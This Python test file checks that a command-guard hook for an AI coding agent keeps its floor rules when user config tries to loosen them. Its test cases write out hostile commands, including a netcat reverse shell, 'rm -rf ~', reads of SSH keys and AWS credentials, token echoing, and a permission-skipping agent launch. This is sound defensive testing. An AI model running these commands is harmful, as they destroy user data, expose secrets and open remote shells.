"""Config may tighten a floor, never lower it (C2, config_floor.py).

Every config below tries to lower one or more floor rules: an ``actions``
policy, a ``classify`` entry that renames a command's type, ``profile``,
``sensitive_paths``/``sensitive_basenames`` allows, ``allow_paths`` and
``protect_package``. Each floored call must come out as it does with no
config at all: same decision, same rule.
"""

import os

import pytest

from nuh import config, content, hook, path_names, sensitive_paths, taxonomy
from nuh.bash import classify_command

ALL_ALLOW = {action_type: taxonomy.ALLOW for action_type in taxonomy.POLICIES}
SAFE_WORDS = ["nuh", "pip", "printenv", "env", "echo", "cat", "sudo", "shutdown", "systemctl", "nc", "bash",
              "claude", "rm", "chmod", "find", "cp", "git log", "python3", "uv", "make", "sh"]
BUILTINS = ["~/.aws", "~/.gnupg", "~/" + ".ssh", "~/.bashrc", "~/.claude/settings.json"]

CONFIGS = {
    "actions_allow": {"actions": ALL_ALLOW},
    "classify_safe_and_allow": {"classify": {"git_safe": SAFE_WORDS}, "actions": ALL_ALLOW},
    "classify_read_only": {"classify": {"filesystem_read": SAFE_WORDS}},
    "profile_none": {"profile": "none"},
    "profile_none_and_allow": {"profile": "none", "actions": ALL_ALLOW},
    "profile_minimal_and_allow": {"profile": "minimal", "actions": ALL_ALLOW},
    "lang_exec_ask": {"actions": {"lang_exec": "ask"}},
    "sensitive_allow": {"sensitive_paths": {entry: "allow" for entry in BUILTINS},
                        "sensitive_basenames": {".env": "allow", "id_rsa": "allow"}},
    "allow_paths": {"allow_paths": {entry: ["@ROOT@"] for entry in [*BUILTINS, "@ROOT@"]}},
    "protect_package_off": {"protect_package": False},
}

# (tool, input, decision, floor rule) with no config at all.
CASES = [
    ("Bash", "nuh allow lang_exec", taxonomy.ASK, "nuh_admin"),
    ("Bash", "printenv", taxonomy.ASK, "env_read"),
    ("Bash", "echo $GITHUB_TOKEN", taxonomy.ASK, "env_read"),
    ("Bash", "sudo apt install x", taxonomy.ASK, "privilege"),
    ("Bash", "shutdown now", taxonomy.ASK, "power_service"),
    ("Bash", "nc -e /bin/sh example.com 1", taxonomy.ASK, "network_shell"),
    ("Bash", "claude --dangerously-skip-permissions", taxonomy.ASK, "unguarded_launch"),
    ("Bash", "rm -rf ~", taxonomy.BLOCK, "catastrophic"),
    ("Bash", "find / -delete", taxonomy.BLOCK, "catastrophic"),
    # A command find runs, a package runner runs or a recipe holds is floored as itself: a profile
    # or a classify entry for find, uv or make must not hide it.
    ("Bash", "find / -exec rm -rf {} +", taxonomy.BLOCK, "catastrophic"),
    ("Bash", "find / -exec sh -c 'rm -rf \"$1\"' _ {} ;", taxonomy.BLOCK, "catastrophic"),
    ("Bash", "find ~ -name '*.json' -exec rm {} +", taxonomy.ASK, "catastrophic"),
    ("Bash", "find . -fprint ~/.claude/settings.json", taxonomy.ASK, "agent_hooks"),
    ("Bash", "find . -exec sh -c 'printenv' ;", taxonomy.ASK, "env_read"),
    ("Bash", "find . -exec sh -c 'cp x ~/.claude/settings.json' ;", taxonomy.ASK, "agent_hooks"),
    ("Bash", "find . -exec python3 hidden.py ;", taxonomy.ASK, "hidden_chars"),
    ("Bash", "uv run rm -rf ~", taxonomy.BLOCK, "catastrophic"),
    ("Bash", "npx rimraf ~", taxonomy.BLOCK, "catastrophic"),
    ("Bash", "make wipe", taxonomy.BLOCK, "catastrophic"),
    ("Bash", "chmod -R 777 /", taxonomy.BLOCK, "catastrophic"),
    ("Bash", "git -c core.pager=sh log", taxonomy.ASK, "git_exec"),
    ("Bash", "cat ~/.aws/credentials", taxonomy.ASK, "credential_paths"),
    ("Bash", "cat ~/" + ".ssh/id_rsa", taxonomy.BLOCK, "credential_paths"),
    ("Bash", "cat .env", taxonomy.ASK, "credential_paths"),
    ("Bash", "cp notes.txt ~/.claude/settings.json", taxonomy.ASK, "agent_hooks"),
    ("Bash", "python3 hidden.py", taxonomy.ASK, "hidden_chars"),
    # The shell expands braces before it reads a path: each piece is floored as if written out.
    ("Bash", "cat {,~/.aws/credentials}", taxonomy.ASK, "credential_paths"),
    ("Bash", "cat {a,~/" + ".ssh/id_rsa}", taxonomy.BLOCK, "credential_paths"),
    ("Bash", "cp {a,~/" + ".ssh/id_rsa} /tmp/x", taxonomy.BLOCK, "credential_paths"),
    ("Bash", "cat ~/.{ssh,x}/id_rsa", taxonomy.BLOCK, "credential_paths"),
    ("Bash", "echo x > {a,~/.claude/settings.json}", taxonomy.ASK, "agent_hooks"),
    ("Bash", "cp a {b,~/.claude/settings.json}", taxonomy.ASK, "agent_hooks"),
    ("Bash", "rm -rf {x,~}", taxonomy.BLOCK, "catastrophic"),
    ("Bash", "rm -rf {,/}", taxonomy.BLOCK, "catastrophic"),
    # A glob is checked by every place it can reach, matching or not (glob_reach): no ~/.ssh exists here.
    ("Bash", "cat ~/" + ".ss*/i*", taxonomy.BLOCK, "credential_paths"),
    ("Bash", "cat ~/.[sa][sw][hs]/*", taxonomy.BLOCK, "credential_paths"),
    ("Bash", "cat ~/" + ".ss(h)/id_*", taxonomy.BLOCK, "credential_paths"),
    ("Bash", "cat ~/.aw?/cred*", taxonomy.ASK, "credential_paths"),
    ("Bash", "echo x > ~/" + ".ss*/config", taxonomy.BLOCK, "credential_paths"),
    ("Bash", "cp x ~/.cl*/settings.json", taxonomy.ASK, "agent_hooks"),
    ("Bash", "{rm,-rf,~}", taxonomy.BLOCK, "catastrophic"),
    ("Bash", "sh -c 'rm -rf {x,~}'", taxonomy.BLOCK, "catastrophic"),
    ("Read", "~/.aws/credentials", taxonomy.ASK, "credential_paths"),
    ("Read", "~/.gnupg/secring.gpg", taxonomy.BLOCK, "credential_paths"),
    ("Read", "~/.bashrc", taxonomy.ASK, "sensitive_paths"),
    ("Read", ".env", taxonomy.ASK, "credential_paths"),
    ("Write", "~/" + ".ssh/authorized_keys", taxonomy.BLOCK, "credential_paths"),
    ("Write", "~/.claude/settings.json", taxonomy.ASK, "agent_hooks"),
    ("Write", ".nuh.yaml", taxonomy.ASK, "project_config"),
    ("Write", os.path.join(path_names.PACKAGE_DIR, "probe.py"), taxonomy.ASK, "package_dir"),
]


def _decide(tool: str, value: str) -> tuple[str, str]:
    """(decision, floor rule) for one call; for Bash, the rule matching the case's is enough."""
    if tool == "Bash":
        result = classify_command(value)
        return result.final_decision, ",".join(result.floor_rules())
    if tool == "Read":
        decision = hook.handle_read({"file_path": value}) or {}
    else:
        decision = hook.handle_write({"file_path": value, "content": "x = 1\n"})
    return decision.get("decision", taxonomy.ALLOW), decision.get("_floor", "")


@pytest.fixture
def in_project(project_root, monkeypatch):
    monkeypatch.chdir(project_root)
    with open(os.path.join(project_root, "hidden.py"), "w") as f:
        f.write("x = 'a‮b'\n")
    with open(os.path.join(project_root, "Makefile"), "w") as f:
        f.write("wipe:\n\trm -rf ~\n")
    return project_root


def _rooted(value, root: str):
    """*value* with every "@ROOT@" in its strings replaced by *root*."""
    if isinstance(value, dict):
        return {_rooted(k, root): _rooted(v, root) for k, v in value.items()}
    if isinstance(value, list):
        return [_rooted(v, root) for v in value]
    return value.replace("@ROOT@", root) if isinstance(value, str) else value


def _load(cfg: dict, root: str) -> None:
    config._cached_config = config._merge_configs(_rooted(cfg, root), {})
    sensitive_paths.reset_sensitive_paths()
    content.reset_content_patterns()


@pytest.mark.parametrize("tool,value,decision,rule", CASES)
def test_baseline(in_project, tool, value, decision, rule):
    found_decision, found_rules = _decide(tool, value)
    assert found_decision == decision and rule in found_rules.split(",")


@pytest.mark.parametrize("name", sorted(CONFIGS))
@pytest.mark.parametrize("tool,value,decision,rule", CASES)
def test_config_cannot_lower_a_floor(in_project, name, tool, value, decision, rule):
    _load(CONFIGS[name], in_project)
    found_decision, found_rules = _decide(tool, value)
    assert taxonomy.STRICTNESS[found_decision] >= taxonomy.STRICTNESS[decision], (name, found_rules)
    if found_decision == decision:
        assert rule in found_rules.split(","), (name, found_rules)
